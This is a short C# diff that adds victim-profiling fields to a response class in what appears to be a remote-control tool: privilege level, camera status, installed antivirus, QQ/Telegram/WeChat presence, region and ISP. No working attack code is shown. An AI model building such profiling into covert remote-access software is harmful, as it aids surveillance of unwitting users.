@@ -13,5 +13,17 @@ namespace RemoteControl.Protocals.Response
         public string HostName;
         public string AppPath;
         public string OnlineAvatar;
+        public string UserName;
+        public string LocalIP;
+        public string OSVersion;
+        public string Privilege;
+        public string CameraStatus;
+        public string Antivirus;
+        public string OnlineQQ;
+        public string TG;
+        public string WX;
+        public string UserStatus;
+        public string Region;
+        public string ISP;
     }
 }
